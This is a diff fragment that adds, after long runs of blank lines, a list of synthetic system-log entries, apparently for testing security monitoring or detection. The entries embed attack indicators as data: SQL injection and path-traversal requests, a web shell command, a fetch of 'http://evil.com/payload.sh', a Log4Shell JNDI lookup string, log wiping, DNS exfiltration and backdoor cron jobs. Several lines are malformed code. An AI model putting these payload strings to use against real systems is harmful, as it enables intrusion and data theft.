@@ -696,3 +696,170 @@ if __name__ == "__main__":
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+"sshd", f"Failed password for invalid user {random_user()} from {attacker_ip} port {random_port()}")
+"sshd", f"Failed password for {target_user} from {attacker_ip} port {random_port()}")
+"sshd", f"Invalid user {user} from {attacker_ip} port {random_port()}")
+"sshd", f"Failed password for {user} from {attacker_ip} port {random_port()}")
+
+"sudo", f"{user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND=/bin/bash")
+"sudo", f"{user} : TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/tar czf /tmp/backup.tar.gz .")
+"sudo", f"{user} : TTY=pts/2 ; PWD=/home/{user} ; USER=root ; COMMAND=/usr/bin/rm /var/log/auth.log")
+"nginx", f'{attacker_ip} - - [{datetime.datetime.now()}] "GET /index.php?page=../../../../etc/passwd HTTP/1.1" 404')
+"nginx", f'{attacker_ip} - - [{datetime.datetime.now()}] "GET /api/v1/users?id=\' OR 1=1 -- HTTP/1.1" 500')
+"nginx", f'{attacker_ip} - - [{datetime.datetime.now()}] "GET http://evil.com/payload.sh" 200')
+"nginx", f'{attacker_ip} - - [{datetime.datetime.now()}] "GET /uploads/shell.php?cmd=whoami HTTP/1.1" 200')
+
+"kernel", f"Firewall: *TCP_IN Blocked* IN=eth0 OUT= MAC=... SRC={attacker_ip} DST=... PROTO=TCP SPT={random_port()} DPT={port}")
+"kernel", f"process '/bin/bash' started by user {num}")
+"kernel", f"process '/bin/sh' started by user {random_user()} with args: payload.sh")
+"kernel", f"process '/bin/java' started child '/bin/bash'")
+"kernel", "process '/usr/bin/php' spawned child '/bin/sh'")
+"kernel", "process '/bin/chmod' started by user root with args: +x /tmp/backdoor.sh")
+"kernel", "Process 'kthreadd' (PID {pid}) opened a network socket to {ip}:{port}")
+"kernel", "BUG: unable to handle kernel NULL pointer dereference at (nil)")
+"kernel", "Oops: 0000 [#1] SMP PTI")
+"kernel", "Kernel panic - not syncing: Fatal exception in interrupt")
+"kernel", "Outbound connection to 104.22.60.184:443 established")
+"kernel", "ptrace attach to process 1234 (systemd) by process 5678 (malware)")
+"kernel", "Virtual memory modification detected in process 1234 by pid 5678")
+"kernel", "Loading kernel module 'evil_module.ko'")
+"kernel", "Tainted kernel: a module has been loaded")
+"kernel", "File 'document.pdf.ENCRYPTED' created")
+
+"myapp", f"segfault at 0 ip 00007f... sp 00007f... error 4 in libc-2.31.so")
+"myapp", f"Received request with suspicious User-Agent: ${{jndi:ldap://{attacker_ip}/a}}")
+"pacman", "Installed nmap (7.91-1)")
+"pacman", "Installed netcat (1.10-7)")
+"bash", "history -c")
+"bash", "system command 'ls' replaced with '/tmp/.hidden_ls'")
+"useradd", f"new user: name={new_user}, UID=1001, GID=1001, home=/{new_user}, shell=/bin/bash")
+"passwd", f"password for user '{new_user}' changed")
+"Xorg.0.log", "(EE) Caught signal 11 (Segmentation fault). Server aborting")
+"systemd", "Shadow copies deleted by process 'encryptor.exe'")
+"systemd", "myapp.service: Main process exited, code=killed, status=11/SEGV")
+"systemd", f"User {user} sent 1.5GB of data to {random_ip()}")
+"systemd", f"DNS query for long-base64-string-of-data.{attacker_domain} from 127.0.0.1")
+"systemd", f"DNS query for another-long-base64-string.{attacker_domain} from 127.0.0.1")
+"systemd", f"User {user} added a new cron job: /tmp/backdoor.sh")
+"systemd", f"SMB connection attempt from {source_host} to {dest_host} as user ADMIN")
+"systemd", f"PsExec service started on {dest_host}")
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
